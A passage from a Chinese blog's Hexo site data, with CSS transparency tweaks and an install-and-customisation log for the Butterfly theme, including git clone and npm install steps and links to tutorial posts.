class="comment"># The banner image of category page</span></span><br><span class="line"><span class="comment"># format:</span></span><br><span class="line"><span class="comment">#  - category name: xxxxx</span></span><br><span class="line"><span class="attr">category_per_img:</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>搜索关键词<code>background</code>, 将颜色设置为：</p> <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Website Background (設置網站背景)</span></span><br><span class="line"><span class="comment"># can set it to color or image (可設置圖片 或者 顔色)</span></span><br><span class="line"><span class="comment"># The formal of image: url(http://xxxxxx.com/xxx.jpg)</span></span><br><span class="line"><span class="attr">background:</span> <span class="string">url(/img/banner.jpg)</span> <span class="comment"># 修改为自己的图片</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Footer Background</span></span><br><span class="line"><span class="attr">footer_bg:</span> <span class="string">transparent</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="2-步骤二：引入魔改样式，修改CSS样式"><a href="#2-步骤二：引入魔改样式，修改CSS样式" class="headerlink" title="2.步骤二：引入魔改样式，修改CSS样式"></a>2.步骤二：引入魔改样式，修改CSS样式</h2><ol><li><p>引入魔改样式的方法很简单，自建一个css文件，然后引入即可：</p><p> 以<code>butterfly</code>主题为例，可以在<code>[博客根目录]\themes\butterfly\source\css\</code>目录下新建<code>custom.css</code>文件，然后在<code>[博客根目录]\themes\butterfly\_config.yml</code>的<code>inject</code>配置项中引入自定义样式文件。</p> <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/custom.css&quot;</span>  <span class="string">media=&quot;defer&quot;</span> <span class="string">onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure><p> 其中<code>media=&quot;defer&quot; onload=&quot;this.media=&#39;all&#39;&quot;</code>是异步加载配置项，确保自定义样式会在页面加载完成后才继续渲染。如果没有需求或效果不好可以不加这个。</p></li><li><p>对于页面的透明度配置有多种方案，此处讨论三种：</p> <details class="folding-tag" ><summary> 点击查看方案 </summary>              <div class='content'>              <ol><li><p><strong>background: rgba(255,255,255,0.5);</strong></p><p> <code>background</code>属性的配置应该算是我们最期望的效果了，它只会使被添加了的该属性的页面元素背景变得透明，而不会对这一页面元素下的其他元素(包括<code>div、span、p、a</code>等任何标签)有任何影响。一般用来对文章内容或页面卡片添加透明度。这样可以保证字体不会变透明</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 首页文章卡片 */</span></span><br><span class="line"><span class="selector-id">#recent-posts</span> &gt; <span class="selector-class">.recent-post-item</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>:<span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 首页侧栏卡片 */</span></span><br><span class="line"><span class="selector-class">.card-widget</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>:<span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>)<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 文章页面正文背景 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#post</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 分页页面 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#page</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 归档页面 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#archive</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 标签页面 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#tag</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 分类页面 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#category</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>opacity: 0.5;</strong></p><p> <code>opacity</code>定义的是全局的透明度，会影响添加该属性的页面元素及其下属元素。</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#footer</span>&#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>background: transparent;</strong></p><p> 这一属性会让定义了该属性的页面元素背景变完全透明，但不会影响下属元素，效果等同于<code>background:rgba(255,255,255,0)</code>。<br> 实例：定义头图或页脚全透明以实现一图流。</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 页脚透明 */</span></span><br><span class="line"><span class="selector-id">#footer</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 头图透明 */</span></span><br><span class="line"><span class="selector-id">#page-header</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */</span></span><br><span class="line"><span class="selector-id">#page-header</span><span class="selector-class">.post-bg</span>:before &#123;</span><br><span class="line">  background-color: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*夜间模式伪类遮罩层透明*/</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-id">#footer</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">      <span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-id">#page-header</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ol>              </div>            </details></li><li><p>我的博客一图流css样式设置如下，修改custom.css文件：</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 首页文章卡片 */</span></span><br><span class="line"><span class="selector-id">#recent-posts</span> &gt; <span class="selector-class">.recent-post-item</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>:<span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 首页侧栏卡片 */</span></span><br><span class="line"><span class="selector-class">.card-widget</span>&#123;</span><br><span class="line"><span class="attribute">background</span>:<span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.8</span>)<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 文章页面正文背景 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#post</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 分页页面 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#page</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 归档页面 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#archive</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 标签页面 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#tag</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 分类页面 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#category</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 页脚透明 */</span></span><br><span class="line"><span class="selector-id">#footer</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 头图透明 */</span></span><br><span class="line"><span class="selector-id">#page-header</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*白天模式伪类遮罩层透明*/</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;light&quot;</span>]</span></span><br><span class="line">  <span class="selector-id">#footer</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">      <span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*夜间模式伪类遮罩层透明*/</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-id">#footer</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">      <span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-id">#page-header</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*夜间模式页面背景设置为半透明*/</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-class">.recent-post-item</span>&#123;</span><br><span class="line">      <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span>&#123;</span><br><span class="line">      <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-id">#post</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-id">#page</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-id">#archive</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-id">#tag</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-tag">div</span><span class="selector-id">#category</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">/*阅读模式*/</span></span><br><span class="line"><span class="selector-class">.read-mode</span> <span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span>&#123;</span><br><span class="line">      <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">158</span>, <span class="number">204</span>, <span class="number">171</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="selector-class">.read-mode</span> <span class="selector-tag">div</span><span class="selector-id">#post</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">158</span>, <span class="number">204</span>, <span class="number">171</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*夜间阅读模式*/</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line">  <span class="selector-class">.read-mode</span> <span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span>&#123;</span><br><span class="line">        <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">        <span class="attribute">color</span>: <span class="number">#eeeeee</span>;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span>  </span><br><span class="line">  <span class="selector-class">.read-mode</span> <span class="selector-tag">div</span><span class="selector-id">#post</span>&#123;</span><br><span class="line">      <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>)<span class="meta">!important</span>;</span><br><span class="line">      <span class="attribute">color</span>: <span class="number">#eeeeee</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></li></ol><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
          <category> 魔改教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
            <tag> 魔改教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Butterfly主题安装魔改日志文档</title>
      <link href="2021/10/04/Butterfly%E4%B8%BB%E9%A2%98%E5%AE%89%E8%A3%85%E9%AD%94%E6%94%B9%E6%97%A5%E5%BF%97%E6%96%87%E6%A1%A3/"/>
      <url>2021/10/04/Butterfly%E4%B8%BB%E9%A2%98%E5%AE%89%E8%A3%85%E9%AD%94%E6%94%B9%E6%97%A5%E5%BF%97%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>Butterfly主题安装魔改日志文档</p><p class='p center small'>Butterfly主题安装魔改日志文档，升级主题方便找到回家的路!</p><p><br/></p><h1 id="1-Butterfly主题安装与应用"><a href="#1-Butterfly主题安装与应用" class="headerlink" title="1.Butterfly主题安装与应用"></a>1.Butterfly主题安装与应用</h1><ol><li><p>通过GitHub安装</p><p> 在你的 Hexo 根目录里clone主题仓库：</p> <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">git clone <span class="literal">-b</span> master https://github.com/jerryc127/hexo<span class="literal">-theme</span><span class="literal">-butterfly</span>.git themes/butterfly</span><br></pre></td></tr></table></figure></li><li><p>应用主题</p><p> 修改 <span class='p red'>Hexo 根目录下的 _config.yml</span>，把主题改为butterfly：</p> <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure></li><li><p>安装插件</p><p> 如果你没有 pug 以及 stylus 的渲染器，请下载安装：</p> <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">npm install hexo<span class="literal">-renderer</span><span class="literal">-pug</span> hexo<span class="literal">-renderer</span><span class="literal">-stylus</span> -<span class="literal">-save</span></span><br></pre></td></tr></table></figure></li><li><p>升级建议</p> <div class="note info modern"><p>升级完成后，请到 Github 的 <span class='p blue'>Releases 界面</span> 或者 <span class='p blue'>文档七</span> 查看新版的更新内容。</p><p>里面有标注 <span class='p red'>_config 文件</span>的变更内容（如有），请根据实际情况更新你的配置内容。</p></div><p> 为了减少升级主题后带来的不便，请使用以下方法（建议，可以不做）:</p> <div class="note info modern"><p>此方法只支持 Hexo 5.0.0 以上版本，建议使用。</p><p>如果已经在 source/<em>data/ 创建了 butterfly.yml，请记得删除掉。</em></p></div><p> 在 hexo 的根目录创建一个文件  <span class='p red'>_config.butterfly.yml</span>，并把主题目录的 <span class='p red'>_config.yml</span> 内容复制到 <span class='p red'>_config.butterfly.yml</span> 去。</p> <div class="note info modern"><p>注意： 不要把主题目录<span class='p red'>_config.yml</span>  删掉。</p></div><p> 以后只需要在 <span class='p red'>_config.butterfly.yml</span>进行配置就行。Hexo会自动合并主题中的<span class='p red'>_config.yml</span> 和 <span class='p red'>_config.butterfly.yml</span>里的配置，如果存在同名配置，会使用<span class='p red'>_config.butterfly.yml</span>的配置，其优先度较高。</p></li><li><p>主题配置</p><p> 请参考butterfly主题官方配置文档：<a href="https://butterfly.js.org/posts/4aa8abbe/"  type="text/html"  target="_blank">主题配置-1</a>、<a href="https://butterfly.js.org/posts/ceeb73f/"  type="text/html"  target="_blank">主题配置-2</a> 、<a href="https://butterfly.js.org/posts/98d20436/"  type="text/html"  target="_blank">主题问答</a>、<a href="https://butterfly.js.org/posts/4073eda/"  type="text/html"  target="_blank">进阶教程</a></p></li></ol><hr><h1 id="2-Butterfly主题魔改"><a href="#2-Butterfly主题魔改" class="headerlink" title="2.Butterfly主题魔改"></a>2.Butterfly主题魔改</h1><h2 id="2-1博客背景使用一图流"><a href="#2-1博客背景使用一图流" class="headerlink" title="2.1博客背景使用一图流"></a>2.1博客背景使用一图流</h2><div class="note success flat"><p>先在配置文件配置背景为图片，再在自定义样式文件设置透明度。</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="background-color: #ff3311;color: #ffffff">点击查看效果    </button><div class="hide-content"><p>这是效果图</p></div></div><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/10/06/博客背景使用一图流/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/10/06/博客背景使用一图流/</p></div></a></div></div><h2 id="2-2版权声明美化"><a href="#2-2版权声明美化" class="headerlink" title="2.2版权声明美化"></a>2.2版权声明美化</h2><div class="note success flat"><p>本篇教程是转载<a href="https://akilar.top/posts/8322f8e6/">Akilarの糖果屋的《（二创）Copyright-beautify》</a>的教程贴，记录博客魔改历程，方便以后升级找到回家的路。</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="background-color: #ff3311;color: #ffffff">点击查看效果    </button><div class="hide-content"><p>这是效果图</p></div></div><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/10/12/版权声明美化/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/10/12/版权声明美化/</p></div></a></div></div><h2 id="2-3自定义样式魔改"><a href="#2-3自定义样式魔改" class="headerlink" title="2.3自定义样式魔改"></a>2.3自定义样式魔改</h2><div class="note success flat"><p>本篇教程参考 <a href="https://akilar.top/posts/ebf20e02/">Akilarの糖果屋的《Custom Beautify》</a>教程贴的基础上进行的二次创作，记录博客魔改历程，方便以后升级找到回家的路。</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="background-color: #ff3311;color: #ffffff">点击查看效果    </button><div class="hide-content"><p>这是效果图</p></div></div><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/10/19/自定义样式魔改/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/10/19/自定义样式魔改/</p></div></a></div></div><h2 id="2-4添加外挂标签"><a href="#2-4添加外挂标签" class="headerlink" title="2.4添加外挂标签"></a>2.4添加外挂标签</h2><div class="note success flat"><p>本篇教程是转载<a href="https://akilar.top/posts/615e2dec/">Akilarの糖果屋的《Tag Plugins Plus》</a>的教程贴，记录博客魔改历程，方便以后升级找到回家的路。</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="background-color: #ff3311;color: #ffffff">点击查看效果    </button><div class="hide-content"><p>这是效果图</p></div></div><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/02/20/外挂标签/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/02/20/外挂标签/</p></div></a></div></div><h2 id="2-5页脚电子时钟（原生）"><a href="#2-5页脚电子时钟（原生）" class="headerlink" title="2.5页脚电子时钟（原生）"></a>2.5页脚电子时钟（原生）</h2><div class="note success flat"><p>根据糖果屋的教程，并加了一些改动。</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="background-color: #ff3311;color: #ffffff">点击查看效果    </button><div class="hide-content"><p>这是效果图</p></div></div><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/10/10/页脚电子时钟（原生）/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/10/10/页脚电子时钟（原生）/</p></div></a></div></div><h2 id="2-6引入阿里图标库"><a href="#2-6引入阿里图标库" class="headerlink" title="2.6引入阿里图标库"></a>2.6引入阿里图标库</h2><div class="note success flat"><p>本篇教程参考 <a href="https://akilar.top/posts/d2ebecef/">Akilarの糖果屋的《Iconfont Inject》</a>教程贴的基础上进行的二次创作，记录博客魔改历程，方便以后升级找到回家的路。</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="background-color: #ff3311;color: #ffffff">点击查看效果    </button><div class="hide-content"><p>这是效果图</p></div></div><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/10/20/引入阿里图标库/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/10/20/引入阿里图标库/</p></div></a></div></div><h2 id="2-7添加首页卡片进入动画"><a href="#2-7添加首页卡片进入动画" class="headerlink" title="2.7添加首页卡片进入动画"></a>2.7添加首页卡片进入动画</h2><div class="note success flat"><p>本篇教程参考<a href="https://akilar.top/posts/abab51cf/">Akilarの糖果屋的《Add Blog Animation — Wowjs》</a>教程贴，记录博客魔改历程，方便以后升级找到回家的路。</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="background-color: #ff3311;color: #ffffff">点击查看效果    </button><div class="hide-content"><p>这是效果图</p></div></div><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/10/31/首页卡片进入动画/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/10/31/首页卡片进入动画/</p></div></a></div></div><h2 id="2-8添加留言板"><a href="#2-8添加留言板" class="headerlink" title="2.8添加留言板"></a>2.8添加留言板</h2><div class="note success flat"><p>此篇文章为了记录博客魔改过程，方便找到回家的路。参考<a href="https://akilar.top/posts/e2d3c450/">Akilarの糖果屋的《信笺样式留言板》</a></p><p>教程，为了方便以后的升级与自定义，本文只记录插件化魔改和旧版markdown魔改方案，减少像源码魔改方案的侵入性。</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="background-color: #ff3311;color: #ffffff">点击查看效果    </button><div class="hide-content"><p>这是效果图</p></div></div><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/11/08/添加留言板/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/11/08/添加留言板/</p></div></a></div></div><h2 id="2-9添加朋友圈"><a href="#2-9添加朋友圈" class="headerlink" title="2.9添加朋友圈"></a>2.9添加朋友圈</h2><div class="note success flat"><p>添加友链朋友圈，方便查看朋友动态。</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="background-color: #ff3311;color: #ffffff">点击查看效果    </button><div class="hide-content"><p>这是效果图</p></div></div><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/11/10/添加朋友圈/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/11/10/添加朋友圈/</p></div></a></div></div><h2 id="2-10添加百宝箱"><a href="#2-10添加百宝箱" class="headerlink" title="2.10添加百宝箱"></a>2.10添加百宝箱</h2><div class="note success flat"><p>在日常生活中我们经常需要收藏许多网址书签来提升我们的办公效率，但是书签的放置，整理和分类的工作总是一言难尽，非常麻烦。因此本次将通过建立一个hexo小站来单独存储我们的所有收藏网址，也就是今天要介绍的百宝箱😛！</p><p>这个百宝箱的搭建你可以理解为是建立一个新的hexo网站，因此很显然他是基于一个主题搭建的，这个主题就是<a href="https://github.com/HCLonely/hexo-theme-webstack/">hexo-theme-webstack</a>。</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="background-color: #ff3311;color: #ffffff">点击查看效果    </button><div class="hide-content"><p>这是效果图</p></div></div><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/11/09/添加百宝箱/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/11/09/添加百宝箱/</p></div></a></div></div><h2 id="2-11添加在线聊天"><a href="#2-11添加在线聊天" class="headerlink" title="2.11添加在线聊天"></a>2.11添加在线聊天</h2><div class="note success flat"><p>从3.0开始，<a href="https://butterfly.js.org/">butterfly主题</a>内置了多种在线聊天工具。你可以选择开启一种，方便你与访客的交流。</p><p>本博客采用的是Gitter在线聊天工具，正好与GitHub组成一套。</p><div class="hide-block"><button type="button" class="hide-button button--animated" style="background-color: #ff3311;color: #ffffff">点击查看效果    </button><div class="hide-content"><p>这是效果图</p></div></div><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/11/08/添加在线聊天/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/11/08/添加在线聊天/</p></div></a></div></div><h2 id="2-12GitHub-Actions-自动部署博客"><a href="#2-12GitHub-Actions-自动部署博客" class="headerlink" title="2.12GitHub Actions 自动部署博客"></a>2.12GitHub Actions 自动部署博客</h2><div class="note success flat"><p>本文参考<a href="https://akilar.top/posts/f752c86d/">Akilarの糖果屋的《使用 Github Action 实现全自动部署》</a>。实现GitHub Actions 自动部署博客，减少编译等待时间，同时可以方便在线修改文章。</p><p>教程文章链接：</p><div class="tag link"><a class="link-card" title="小森林教程贴" href="/2021/11/11/GitHub Actions 自动部署博客/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png"/></div><div class="right"><p class="text">小森林教程贴</p><p class="url">/2021/11/11/GitHub Actions 自动部署博客/</p></div></a></div></div><h2 id="2-13添加GitHub提交日历"><a href="#2-13添加GitHub提交日历" class="headerlink" title="2.13添加GitHub提交日历"></a>2.13添加GitHub提交日历</h2><div class="note success flat"><p>此魔改参考：<a href="https://zfe.space/post/hexo-githubcalendar.html">小冰博客的《教程：hexo-githubcalendar 插件 1.0》</a>和<a 